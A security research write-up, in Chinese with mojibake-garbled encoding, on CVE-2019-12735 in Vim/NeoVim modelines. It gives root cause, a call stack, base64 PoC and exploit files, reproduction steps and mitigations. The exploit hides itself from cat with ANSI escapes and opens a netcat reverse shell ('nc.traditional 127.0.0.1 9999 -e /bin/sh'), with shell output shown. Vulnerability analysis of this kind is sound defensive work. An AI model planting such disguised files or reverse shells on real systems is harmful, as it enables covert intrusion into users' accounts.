# Vim modelineå‘½ä»¤æ‰§è¡Œæ¼æ´åˆ†æ(cve-2019-12735) 

## 0.ä½œè€…

invincible1944@gmail.com

## 1.èƒŒæ™¯ä»‹ç»

- æ¼æ´ç›¸å…³è½¯ä»¶ï¼šVim/NeoVim 

- Vim/NeoVim ç®€ä»‹

    - Vimæ˜¯ä»viå‘å±•å‡ºæ¥çš„ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨ï¼Œæ˜¯Linux å¹³å°æœ€å¸¸ç”¨çš„ç¼–è¾‘å™¨ä¹‹ä¸€ã€‚
    - Neovim æ˜¯Vimçš„ä¸€ä¸ªé‡æ„ç‰ˆæœ¬ï¼Œè‡´åŠ›äºæˆä¸ºVimçš„è¶…é›†ï¼ˆsupersetï¼‰ï¼Œ

    - Neovimçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬åœ¨2015å¹´12æœˆå‘è¡Œï¼Œå¹¶ä¸”èƒ½å¤Ÿå®Œå…¨å…¼å®¹Vimçš„ç‰¹æ€§ã€‚ 

    - ç›¸æ¯”äºVimï¼ŒNeovimçš„ä¸»è¦æ”¹è¿›åœ¨äºå…¶æ”¯æŒå¼‚æ­¥åŠ è½½æ’ä»¶ã€‚

- æ¼æ´å±å®³ï¼šæ‰“å¼€æ¶æ„æ„é€ çš„æ–‡æœ¬æ–‡ä»¶ï¼Œå¯ä»¥è§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œä½¿æ”»å‡»è€…è·å¾—å½“å‰ç”¨æˆ·æƒé™ã€‚

- ç›¸å…³èƒŒæ™¯çŸ¥è¯†ï¼šè§é™„ä»¶ï¼Œcve-2019-12735-01

  

## 2.æ¼æ´åˆ†æ

- æ¼æ´åŸç†ï¼š
    Vim çš„sandboxå¯¹è¾“å…¥çš„å‘½ä»¤å®¡æŸ¥ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡sourceå‘½ä»¤åŠ è½½å…¶ä»–Vimè„šæœ¬ç»•è¿‡æ²™ç®±æ‰§è¡Œï¼Œé…åˆä¸Šmodelineç‰¹æ€§ï¼Œå¯ä»¥åœ¨Vimæ‰“å¼€æ™®é€šæ–‡ä»¶æ—¶å®ç°OS command injectionã€‚

- æ¼æ´æ‰€å±è½¯ä»¶é“¾æ¥ï¼Œç‰ˆæœ¬ï¼Œæ¨¡å—ï¼Œç›®å½•ï¼Œæ–‡ä»¶ï¼Œä»£ç è¡Œ

    - æ¼æ´è½¯ä»¶ç‰ˆæœ¬ï¼š`Vim <= 8.1.1365/ NeoVim  <= 0.3.6`

    - æ¼æ´ä»£ç ä½ç½®ï¼š`Vim 81/src/getchar.c -> openscript`

    - [Vimå®˜ç½‘](https://www.vim.org/)

    - [Vimæºç åº“](http://ftp.vim.org/pub/vim/unix/)

- æ¼æ´æ‰€å±ç±»å‹ï¼š[CWE-78 OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

- æ¼æ´è¡¥ä¸ï¼š[Vim patch](https://github.com/vim/vim/commit/5357552)

- æ¼æ´CVEå·ï¼š[CVE-2019-12735](https://nvd.nist.gov/vuln/detail/CVE-2019-12735)

  

## 3. POC

##### a. POCåŸç†

- èƒŒæ™¯ç®€ä»‹

    - Vimå¯ä»¥é€šè¿‡Vimè„šæœ¬ç¼–å†™æ’ä»¶ï¼Œé€šè¿‡`source[!]`å‘½ä»¤åŠ è½½å’Œæ‰§è¡Œè„šæœ¬
    - Vimæ”¯æŒé€šè¿‡Vim commandæˆ–è€…Vimè„šæœ¬æ‰§è¡ŒshellæŒ‡ä»¤
    - vimæ”¯æŒé€šè¿‡è¡¨è¾¾å¼(å¯ä»¥ç†è§£ä¸ºçŸ­è„šæœ¬)å¯¹æ–‡æœ¬è¿›è¡Œè®¾ç½®(æ¯”å¦‚foldingä»£ç å—æŠ˜å æ˜¾ç¤ºåŠŸèƒ½)
    - è¡¨è¾¾å¼æ”¯æŒVimæŒ‡ä»¤ï¼Œä½†æ˜¯ä¼šåœ¨è‡ªå·±çš„sandboxæ‰§è¡Œï¼Œåªè¾“å‡ºæ‰§è¡Œç»“æœ
    - Vimè¡¨è¾¾å¼ä¸­å­˜åœ¨ä¸€äº›è‡ªå¸¦çš„å‡½æ•°`execute, assert_fails`ç­‰ï¼Œå¯ä»¥å°†Vim commandä½œä¸ºå‚æ•°æ‰§è¡Œã€‚
    - ç”±äºé™åˆ¶ä¸ä¸¥æ ¼ï¼Œå½“è¡¨è¾¾å¼é€šè¿‡execute, assert_failsè¿™ç±»å‡½æ•°æ‰§è¡Œsourceå‘½ä»¤æ—¶ï¼Œä¼šåœ¨sandboxä¸­æ‰§è¡Œï¼Œä½†æ˜¯source åŠ è½½çš„Vimè„šæœ¬åˆ™ä¼šåœ¨æ­£å¸¸è¿›ç¨‹ç¯å¢ƒä¸­æ‰§è¡Œ
    - Vimçš„modelineåŠŸèƒ½æ˜¯ç”¨äºå¯¹å•ä¸ªæ–‡ä»¶è¿›è¡Œè‡ªåŠ¨é…ç½®çš„ï¼Œå¹¶ä¸”ä¹Ÿå¯ä»¥è®¾ç½®å¸¦æœ‰è¡¨è¾¾å¼çš„é…ç½®ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨æ­¤ç‰¹æ€§åœ¨Vimæ‰“å¼€ç²¾å¿ƒæ„é€ çš„æ¶æ„æ–‡æœ¬æ—¶å®ç°OS command injection.

- PocåŸç†

    è¦ç†è§£Pocçš„åŸç†ï¼Œéœ€è¦æœ‰ä¸€äº›Vimç›¸å…³çš„èƒŒæ™¯çŸ¥è¯†ï¼Œè§é™„ä»¶: cve-2019-12735-01

    ä¸‹é¢ğŸ‘‡æ˜¯Pocçš„æµç¨‹ï¼š

    - vim æ‰“å¼€pocæ–‡ä»¶ï¼Œè¯†åˆ«å‡ºæ–‡ä»¶é¦–éƒ¨çš„modeline

    - è·³è¿‡å¼€å¤´çš„textï¼Œä»`"vi:"`åé¢å¼€å§‹ä¾æ¬¡åŠ è½½é…ç½®é€‰é¡¹

    - åŠ è½½åˆ°fdeé€‰é¡¹æ—¶ï¼Œæ‰§è¡Œè¡¨è¾¾å¼ä¸­çš„`assert_fails`å‡½æ•°ï¼Œè¿›è€Œæ‰§è¡Œ`source! %`æŒ‡ä»¤

    - `source! % `å°†å½“å‰æ–‡ä»¶ä½œä¸ºVimè„šæœ¬åŠ è½½å¹¶æ‰§è¡Œ

    - Vimè„šæœ¬çš„å†…å®¹å°±æ˜¯Pocæ–‡ä»¶ï¼Œä½†æ˜¯è¿™æ¬¡ä¸ç›´æ¥æ‰“å¼€ä¸åŒï¼Œæ˜¯ä½œä¸ºè„šæœ¬åŠ è½½ï¼Œæ‰€ä»¥æ–‡ä»¶å†…å®¹ä¸ä¼šè¢«è¯†åˆ«ä¸ºmodelineï¼Œè€Œæ˜¯è¯†åˆ«ä¸ºVimè„šæœ¬ï¼Œå…·ä½“å«ä¹‰æ˜¯æ‰§è¡Œshellå‘½ä»¤```uname -a || "some text"```ï¼Œä»è€Œå®ç°äº†å‘½ä»¤æ‰§è¡Œ

- è°ƒç”¨æ ˆä¿¡æ¯

```shell
#0  openscript (
    name=0x88fba8 "/home/invincible/Desktop/test/vim_test/poc.txt", 
    directly=0x0) at getchar.c:1415
#1  0x000000000046e06f in cmd_source (
    fname=0x88fba8 "/home/invincible/Desktop/test/vim_test/poc.txt", 
    eap=0x7fffffffc5c0) at ex_cmds2.c:3502
#2  0x000000000046dfd8 in ex_source (eap=0x7fffffffc5c0) at ex_cmds2.c:3484
...
#4  0x0000000000470d89 in do_cmdline (cmdline=0x87ea80 "source! %", 
...
#7  0x00000000004395ec in call_func (
    funcname=0x884d40 "assert_fails(\"source! %\")", len=0xc, 
...
#9  0x00000000004337f8 in eval7 (arg=0x7fffffffd680, rettv=0x7fffffffd6c0, 
...
#16 0x000000000043189b in eval0 (arg=0x884d40 "assert_fails(\"source! %\")", 
#17 0x000000000042cc06 in eval_foldexpr (
    arg=0x884d40 "assert_fails(\"source! %\")", cp=0x7fffffffd70c)
#18 0x00000000004a8403 in foldlevelExpr (flp=0x7fffffffd7b0) at fold.c:3032
...
#26 0x000000000040e02f in chk_modeline (lnum=0x1, flags=0x0) at buffer.c:5234
#27 0x000000000040dba6 in do_modelines (flags=0x0) at buffer.c:5115
...
#30 0x00000000005e8db0 in main (argc=0x2, argv=0x7fffffffde98) at main.c:881
...

```

    

### b.POCæºç 

```shell
$ echo "OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK" | base64 --decode > poc.txt
$ cat poc.txt 
:!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
$vim poc.txt

```

### c.å¤ç°æ­¥éª¤

- å¤ç°ç¯å¢ƒ

    - ç¯å¢ƒæ¸…å•

        - ç³»ç»Ÿç‰ˆæœ¬: Ubuntu-16.04.6 LTS (Xenial Xerus)
        - Vimç‰ˆæœ¬: VIM - Vi IMproved 7.4 
        - Vim package ç‰ˆæœ¬:  2:7.4.1689-3ubuntu1
        - é•œåƒä¸‹è½½åœ°å€: https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/14.04.6/ubuntu-14.04.6-desktop-amd64.iso

    - QEMUè™šæ‹Ÿæœºæ­å»ºæ­¥éª¤ï¼š
```
#  åˆ›å»ºè™šæ‹Ÿæœºç¡¬ç›˜
$ qemu-img create -f qcow2 ubuntu16.04.6.img 10G

# å®‰è£…è™šæ‹Ÿæœº
$ qemu-system-x86_64  -m 2048 -hda ubuntu16.04.6.img -cdrom ./ubuntu-16.04.6-desktop-amd64.iso

# å¯åŠ¨è™šæ‹Ÿæœº
$ qemu-system-x86_64 -m 2048  ubuntu16.04.6.img
```  
- Step1 - å®‰è£…nc.traditional  
    å»ºç«‹ä¼šè¯çš„æ–¹å¼å¾ˆå¤šï¼Œè¿™ä¸€æ­¥åªæ˜¯ä¸ºäº†æ¼”ç¤ºexpéœ€è¦ã€‚

```shell
sudo apt-get install netcat-traditional
```

- Step2 - å®‰è£…å«æ¼æ´ç‰ˆæœ¬çš„Vim

```shell
$ sudo apt-get install vim-runtime=2:7.4.1689-3ubuntu1
$ sudo apt-get install vim-common=2:7.4.1689-3ubuntu1
$ sudo apt-get install vim=2:7.4.1689-3ubuntu1
```

- Step3 - æ£€æŸ¥Vimé…ç½®æ˜¯å¦å¼€å¯modelineï¼Œè‹¥æ²¡æœ‰åˆ™é…ç½®Vim

```shell
# æ£€æŸ¥modelineé…ç½®
vim
:verbose set modeline? set modelines?
# å¦‚æœæ˜¾ç¤ºnomodelineæˆ–è€…nomodelinesè¡¨ç¤ºæ²¡æœ‰é…ç½®

# é…ç½®æ–¹æ³•ï¼š
vim ~/.vimrc
i
set modeline
set modelines=5
<ESC>
:wq

```

- Step4 - åˆ›å»ºpocæ–‡ä»¶

```shell
echo "G1s/OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK" | base64 --decode > poc.txt

# base64ç¼–ç æ˜æ–‡ï¼š
:!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="\n

```

- Step5 - ç”¨vimæ‰“å¼€è§¦å‘å‘½ä»¤æ‰§è¡Œ``(uname -a)``

```shell
$ vim poc.txt 

Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

Press ENTER or type command to continue

```



## 4. EXP

##### a. EXPåŸç†

- Expæ˜¯ä¸€æ¡ç²¾å¿ƒæ„é€ çš„modelineï¼Œä¸»è¦æ˜¯ä¸ºäº†æŠŠæ¶æ„æ–‡ä»¶ä¼ªé€ æˆæ­£å¸¸æ–‡æœ¬ï¼Œæ¶ˆé™¤ç—•è¿¹ï¼› 

- å¯ä»¥åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†ç”¨äºæ¬ºéª—Vimï¼Œå®ç°ä»£ç æ‰§è¡Œï¼Œéšè—æ¶æ„æ–‡æœ¬å†…å®¹ï¼›

- å¦ä¸€éƒ¨åˆ†ç”¨äºæ¬ºéª—catï¼Œä½¿æ–‡æœ¬æ‰“å¼€æ—¶çœ‹èµ·æ¥æ˜¯æ­£å¸¸æ–‡æœ¬ï¼›

- ä¸»è¦é€šè¿‡ANSI Escape Codeæ¥å®ç°è¿™äº›éšè—åŠŸèƒ½ã€‚

VimåŠ è½½expæ–‡ä»¶åç­‰åŒäºæ‰§è¡Œä¸‹é¢çš„åºåˆ—ï¼š

```shell
# modelineè§¦å‘æ‰§è¡Œè‡ªåŠ¨é…ç½®
:set fen
:set fdm=expr
:set fde=assert_fails('set\ fde=x\ \|\ source\!\ \%')
:set fdl=0

# fde=assert_failsè§¦å‘äº†assert_failså‡½æ•°è°ƒç”¨
:call assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\')

# assert_failså‡½æ•°æ‰§è¡Œvimå‘½ä»¤
:set fde=x | source! %

# source! % åŠ è½½å½“å‰æ–‡ä»¶ï¼Œå¹¶è§†ä¸ºVim Ex modeä¸‹çš„è„šæœ¬æ‰§è¡Œï¼š
<ESC>
S
Nothing here.
<ESC>
:silent! w
:call system('nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &') 
:redraw! 
:file 
:silent! # " vim: set fen fdm=expr fde=assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b[1G\x16\x1b[KNothing here."\x16\x1b[D \n

# è¯»å–åˆ°æ¢è¡Œç¬¦å·å\næ‰§è¡Œä¸Šé¢ç¬¬ä¸€ä¸ªsilent!ä»¥åŠåé¢çš„å‘½ä»¤
# é€šè¿‡vimçš„systemå‡½æ•°æ‰§è¡Œäº†ç³»ç»Ÿå‘½ä»¤,å»ºç«‹åå¼¹shell

```

é€æ¡è§£é‡Šï¼š

```shell
# exp.txt: 
\x1b[?7l\x1bSNothing here.\x1b:silent! w | call system(\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b[1G\x16\x1b[2KNothing here."\x16\x1b[2D  \n

# ä¸‹æ–‡æ‹¬å·ä¸­çš„cè¡¨ç¤ºç”¨äºæ¬ºéª—catï¼Œvè¡¨ç¤ºVimè„šæœ¬æ­£å¸¸æŒ‡ä»¤

\x1b[?7l (c)
# å…³é—­è‡ªåŠ¨æ¢è¡Œ
# é…åˆ\x1b[1Gå’Œ\x1b[Kä½¿ç”¨ï¼Œè§ä¸‹æ–‡
# å…·ä½“å®šä¹‰å’Œæµ‹è¯•Demoè§é™„ä»¶ ANSI escape codes éƒ¨åˆ†

\x1bS (v)
# <ESC>S ç›¸å½“äºä¾æ¬¡æŒ‰ä¸‹ESCé”®å’ŒSé”®
# è¡¨ç¤ºå‰ªåˆ‡å½“å‰è¡Œï¼Œå¹¶ä»Normal modeåˆ‡æ¢åˆ°Insert mode
# ç»æµ‹è¯•ï¼Œè¿™é‡Œçš„\x1bæ˜¯å¯ä»¥å»æ‰çš„
# å…·ä½“å®šä¹‰å’Œæµ‹è¯•Demoè§é™„ä»¶ ANSI escape codes éƒ¨åˆ†

Nothing here. (v)
# åœ¨Insert modeä¸‹å†™å…¥å­—ç¬¦ä¸² Nothing here.

\x1b (v)
# ç›¸å½“äºä¾æ¬¡æŒ‰ä¸‹ESCé”®ï¼Œé€€å‡ºInsert mode è¿”å›Normal mode

:  (v)
# ä»Normal modeè¿›å…¥Command-line mode

silent! w (v)
# ä¿å­˜å†™å…¥çš„å†…å®¹ï¼Œå¹¶ä¸”å…³é—­å›æ˜¾
# å…·ä½“å®šä¹‰å’Œæµ‹è¯•Demoè§é™„ä»¶ Vimè¡¨è¾¾å¼å’Œè„šæœ¬éƒ¨åˆ†

| call system(\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\') (v)
# è°ƒç”¨system å‡½æ•°æ‰§è¡ŒShellå‘½ä»¤
# å…·ä½“å®šä¹‰å’Œæµ‹è¯•Demoè§é™„ä»¶ Vimè¡¨è¾¾å¼å’Œè„šæœ¬éƒ¨åˆ†

| redraw! (v)
# æ¸…é™¤å›æ˜¾ä¿¡æ¯
# å…·ä½“å®šä¹‰å’Œæµ‹è¯•Demoè§é™„ä»¶ Vimè¡¨è¾¾å¼å’Œè„šæœ¬éƒ¨åˆ†

| file | silent! [some text] (v)
# æ˜¾ç¤ºå½“å‰æ–‡ä»¶ä¿¡æ¯ï¼Œsilent!ç”¨äºæ¸…é™¤åé¢çš„å­—ç¬¦ä¸²äº§ç”Ÿçš„æŠ¥é”™ä¿¡æ¯
# æœ€åçš„æ•ˆæœå°±æ˜¯å±å¹•åº•éƒ¨æ˜¾ç¤ºçš„æ˜¯fileçš„æ‰§è¡Œç»“æœ

vim: set fen fdm=expr fde=assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: (v)
# vimåŠ è½½æ—¶modelineçš„æ­£æ–‡éƒ¨åˆ†
# fen foldenable, å¼€å¯ä»£ç æŠ˜å foldingåŠŸèƒ½
# fdm foldmethod, è®¾ç½®foldingæ–¹æ³•ä¸ºexpr
# fde foldexpr, è®¾ç½®fold expression
# assert_fails Vimçš„å†…éƒ¨å‡½æ•°ï¼Œå¯ä»¥æ‰§è¡Œç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šçš„vimå‘½ä»¤ï¼Œå…·ä½“è§é™„ä»¶
# æ­¤å¤„æ‰§è¡Œäº†ä¸¤ä¸ªå‘½ä»¤ï¼š
# set fde æŠŠfoldexprè®¾ç½®ä¸ºx(ç›¸å½“äºè®¾ç½®ä¸ºæ— æ•ˆ)
# source % æŠŠå½“å‰æ–‡ä»¶è§†ä¸ºvimè„šæœ¬ï¼ŒåŠ è½½å¹¶æ‰§è¡Œ
# fdl foldlevel è®¾ç½®ä¸º0è¡¨ç¤ºæ‰€æœ‰æ»¡è¶³æ¡ä»¶çš„æ–‡æœ¬å—éƒ½æŠ˜å æ˜¾ç¤º(ä¸expæ— å…³)

\x16 (v) 
# è¿™ä¸ªå¾ˆå…³é”®ï¼Œç”±äºæ˜¯ç”¨source! %æ‰“å¼€ï¼Œæ‰€ä»¥æ–‡æœ¬çš„å†…å®¹éƒ½ä¼šè¯†åˆ«æˆåœ¨Normal modeä¸‹çš„è¾“å…¥ï¼Œæ¯”å¦‚\x1bå°±æ˜¯æŒ‰ä¸‹<ESC>, Så°±ä»£è¡¨æŒ‰ä¸‹é”®ç›˜(shift+s)ï¼Œè€Œå½“æ‰§è¡Œåˆ°ç¬¬äºŒä¸ªsilent! ä¹‹åï¼Œåé¢çš„å­—ç¬¦ä¸²ç›´åˆ°'\n'æˆ‘ä»¬å¸Œæœ›å®ƒä»¬è¢«å¿½ç•¥ï¼Œä½†æ˜¯ä¸ºäº†æ„é€ catçš„è¾“å‡º, å­—ç¬¦ä¸²ä¸­åŒ…å«äº†å¾ˆå¤šescape codeæ¯”å¦‚\x1b[D, ä½†æ˜¯è¿™äº›ä¹Ÿä¼šè¢«è¯†åˆ«æˆé”®ç›˜çš„æŒ‰é”®æ“ä½œï¼Œå¯¼è‡´æ•´ä¸ªæŒ‡ä»¤éƒ½æ— æ³•æ‰§è¡Œ è€Œ\x16æ­£æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå®ƒä¼šæŠŠä¸‹ä¸€ä¸ªæŒ‰é”®è§£ææˆå­—ç¬¦è€Œä¸ä¼šè®©å®ƒæ‰§è¡ŒæŒ‰é”®åŠŸèƒ½ï¼Œå…·ä½“åˆ†æè§é™„ä»¶ ANSI escape codeséƒ¨åˆ†ã€‚


\x1b[1G (c)
# catæ‰“å¼€æ—¶å€™ï¼Œå°†å…‰æ ‡ç§»åŠ¨åˆ°å½“å‰è¡Œçš„é¦–éƒ¨
# é…åˆ\x1b[Kå’Œ\x1b[?7lï¼Œè§ä¸‹æ–‡
# å…·ä½“åˆ†æå’ŒDemoè§é™„ä»¶ ANSI escape codeséƒ¨åˆ†ã€‚

\x16 (v)
# ä½œç”¨åŒä¸Š

\x1b[2K (c)
# é…åˆ\x1b[1Gå’Œ\x1b[?7lï¼Œåˆ é™¤å½“å‰ä½ç½®åˆ°è¡Œé¦–çš„å†…å®¹(ä¸ä¼šæ”¹å˜æ–‡æœ¬ï¼Œåªæ”¹å˜è¾“å‡ºå†…å®¹)
# ç»è¿‡è¿™ä¸ªå¤„ç†ï¼Œcatçš„æŸ¥çœ‹ç»“æœå°±åªå‰©ä¸‹åé¢çš„ä¿¡æ¯äº†
# å…·ä½“åˆ†æå’ŒDemoè§é™„ä»¶ ANSI escape codeséƒ¨åˆ†ã€‚

Nothing here." (c)
# å‡†å¤‡è®©catæŸ¥çœ‹æ–‡ä»¶è¾“å‡ºçš„å­—ç¬¦ä¸²ï¼Œä¸Vimæ‰“å¼€æ–‡ä»¶æ—¶æŸ¥çœ‹åˆ°çš„å†…å®¹ç›¸åŒ

\x16 (v)
# ä½œç”¨åŒä¸Š

\x1b[2D (c) 
# å…‰æ ‡å‘å‰ç§»åŠ¨2ä½
# å…·ä½“åˆ†æå’ŒDemoè§é™„ä»¶ ANSI escape codeséƒ¨åˆ†ã€‚

  \n (c&v)
# å› ä¸ºå…‰æ ‡å‰ç§»,ä¸¤ä¸ªç©ºæ ¼ä¼šè¦†ç›–Nothing here." å­—ç¬¦ä¸²æœ€åçš„å¼•å·"å’Œ\x16
# äºæ˜¯catçš„è¾“å‡ºåªå‰©ä¸‹ \x16Nothing here.\n
# \næ¢è¡Œè§¦å‘ silent! w | ... | file | silent! [some text]  æ•´æ¡å‘½ä»¤çš„æ‰§è¡Œ
# å…¶ä¸­call systemå®Œæˆç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå»ºç«‹åå¼¹shell


```

  

##### b. EXPæºç 

åŸä½œè€…exp: [shell.txt](https://github.com/numirias/security/blob/master/data/2019-06-04_ace-vim-neovim/shell.txt)

ä¼˜åŒ–è¿‡çš„exp: 

```shell
echo "G1s/N2wbUyBOb3RoaW5nIGhlcmUuGzpzaWxlbnQhIHcgfCBjYWxsIHN5c3RlbSgnbm9odXAgbmMudHJhZGl0aW9uYWwgMTI3LjAuMC4xIDk5OTkgLWUgL2Jpbi9zaCAmJykgfCByZWRyYXchIHwgZmlsZSB8IHNpbGVudCEgIyAiIHZpbTogc2V0IGZlbiBmZG09ZXhwciBmZGU9YXNzZXJ0X2ZhaWxzKCdzZXRcIGZkZT14XCBcfFwgc291cmNlXCFcIFwlJykgZmRsPTA6IBYbWzFHFhtbMktOb3RoaW5nIGhlcmUuIhYbWzJEICAK" | base64 --decode > exp.txt

# base64ç¼–ç å¯¹åº”çš„æ˜æ–‡
\x1b[?7l\x1bS Nothing here.\x1b:silent! w | call system(\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b[1G\x16\x1b[2KNothing here."\x16\x1b[2D  \n

# ä¿®æ”¹äº†å››å¤„
# ä¿®æ”¹åŸå› è§é™„ä»¶
# nc -> nc.traditional 
# \x1b[K -> \x1b[2K 
# \x1b[D -> \x1b[2D 
#  \n  ->   \n (å¢åŠ äº†ä¸€ä¸ªç©ºæ ¼)

```



##### c. å¤ç°æ­¥éª¤

- æ­å»ºå¤ç°ç¯å¢ƒï¼Œä¸Pocç›¸åŒ

- Step1 - åˆ›å»ºexpæ–‡ä»¶

```shell
$ echo "G1s/N2wbUyBOb3RoaW5nIGhlcmUuGzpzaWxlbnQhIHcgfCBjYWxsIHN5c3RlbSgnbm9odXAgbmMudHJhZGl0aW9uYWwgMTI3LjAuMC4xIDk5OTkgLWUgL2Jpbi9zaCAmJykgfCByZWRyYXchIHwgZmlsZSB8IHNpbGVudCEgIyAiIHZpbTogc2V0IGZlbiBmZG09ZXhwciBmZGU9YXNzZXJ0X2ZhaWxzKCdzZXRcIGZkZT14XCBcfFwgc291cmNlXCFcIFwlJykgZmRsPTA6IBYbWzFHFhtbMktOb3RoaW5nIGhlcmUuIhYbWzJEICAK" | base64 --decode > exp.txt

```

- Step2 - ç›‘å¬ncå›è¿ç«¯å£

```shell
$ nc -vlp 9999
Listening on [0.0.0.0] (family 0, port 9999)

```

- Step3 - Vimæ‰“å¼€expæ–‡ä»¶

```shell
$ vim exp.txt
 Nothing here.
~                                                                      
...                                                                     
~                                                                               
"exp.txt" line 1 of 1 --100%-- col 14

```

- ä¼šè¯å»ºç«‹æˆåŠŸ

```shell
$ nc -vlp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from [127.0.0.1] port 9999 [tcp/*] accepted (family 2, sport 55824)
pwd
/home/invincible/Desktop/test/vim_test
id
uid=1000(invincible) gid=1000(invincible) groups=1000(invincible),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)


```

  

### d. åˆ©ç”¨æ ¸å¿ƒè¦ç´ 

- Vimçš„modelineå¯ä»¥åœ¨æ–‡ä»¶åŠ è½½æ—¶è‡ªåŠ¨é…ç½®ï¼›

- Vimè¿›è¡Œé…ç½®æ—¶ä¼šæ‰§è¡ŒVimæŒ‡ä»¤ï¼Œè€ŒVimçš„æŸäº›æŒ‡ä»¤åˆèƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿçš„ShellæŒ‡ä»¤(é€šè¿‡`fork+execvp/system`)ï¼›

- Vimçš„å¯¹å¯æ‰§è¡ŒæŒ‡ä»¤çš„æ¡ä»¶å®¡æŸ¥ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚

## 5.é˜²æŠ¤å»ºè®®

- å¦‚ä½•æ£€æµ‹è¿™ä¸ª/ç±»æ¼æ´
    - packageç‰ˆæœ¬æ£€æŸ¥ï¼šè·å–å½“å‰ç³»ç»Ÿvimçš„packageç‰ˆæœ¬ä¿¡æ¯ï¼Œå¯¹æ¯”packageçš„changelogåˆ¤æ–­å½“å‰ç‰ˆæœ¬æ˜¯å¦ä¿®å¤äº†æ¼æ´(å¦‚æœæ˜¯æ‰‹åŠ¨ç¼–è¯‘å¯èƒ½å­˜åœ¨æ— æ³•è·å–packageä¿¡æ¯çš„æƒ…å†µ)å…·ä½“æ“ä½œè§é™„ä»¶-æ¼æ´é˜²æŠ¤->packageç‰ˆæœ¬æ£€æŸ¥éƒ¨åˆ†
    - pocéªŒè¯ï¼šæ‰‹åŠ¨éªŒè¯ï¼Œä»£ç æ‰§è¡Œvimè¯»å–stdoutï¼Œæˆ–è€…ptraceè¯»å–è°ƒç”¨æ ˆã€‚å…·ä½“è§é™„ä»¶-æ¼æ´é˜²æŠ¤-> pocéªŒè¯éƒ¨åˆ†ã€‚
- å¦‚ä½•é˜²å¾¡è¿™ä¸ª/ç±»æ¼æ´
    - æ›´æ–°è½¯ä»¶ï¼Œè¿™æ˜¯æœ€ç®€å•é€šç”¨çš„æ–¹æ³•ï¼›
    - é…ç½®æ£€æŸ¥ï¼ŒDebianç­‰ä¸€äº›å‘è¡Œç‰ˆå·²ç»é»˜è®¤å…³é—­äº†modelineçš„é…ç½®ï¼Œè¿™æ ·å¯ä»¥å®Œå…¨éš”æ–­è¯¥æ¼æ´çš„åˆ©ç”¨è·¯å¾„ï¼Œå¦‚æœé»˜è®¤æ²¡æœ‰å…³é—­ï¼Œåˆ™éœ€è¦æ‰‹åŠ¨å…³é—­ï¼Œå…·ä½“é…ç½®æ–¹æ³•è§é™„ä»¶-æ¼æ´é˜²æŠ¤-> é…ç½®æ£€æŸ¥éƒ¨åˆ†ï¼›
    - æ–‡ä»¶ç›‘æ§ï¼ŒåŒ¹é…æ–‡ä»¶é¦–éƒ¨æˆ–è€…å°¾éƒ¨æ˜¯å¦ç¬¦åˆmodelineç‰¹å¾ï¼Œå¦‚æœç¬¦åˆï¼Œä¸”modelineä¸­åŒ…å«"source"å­—ç¬¦ä¸²ï¼Œå¯ä»¥å‘å‡ºè­¦æŠ¥(éé€šç”¨æ–¹æ³•ï¼Œå¯¹ç³»ç»Ÿæ€§èƒ½æœ‰æŸè€—)ã€‚
- æœ‰æ²¡æœ‰å“ªç§é€šç”¨çš„ç¼“è§£æªæ–½å¯ä»¥é˜»æ–­è¿™ä¸ª/ç±»æ¼æ´
    - ä»…é’ˆå¯¹è¯¥æ¼æ´çš„é€šç”¨ç¼“è§£æªæ–½å°±æ˜¯å…³é—­modelineé…ç½®ï¼›
    - è¯¥ç±»æ¼æ´å±äºOSå‘½ä»¤æ³¨å…¥ï¼Œä¸€èˆ¬æ˜¯é€šè¿‡ç›‘æ§system/fork/execç­‰ç³»ç»Ÿå‡½æ•°å¯ä»¥å‘ç°å’Œé˜»æ–­å¨èƒ(ä½†æ˜¯å¯¹ç³»ç»Ÿæ€§èƒ½æœ‰æŸè€—)ã€‚

## 6.å‚è€ƒ

[https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md](https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md)  
[https://imbawenzi.github.io/2019/08/03/vim/](https://imbawenzi.github.io/2019/08/03/vim/)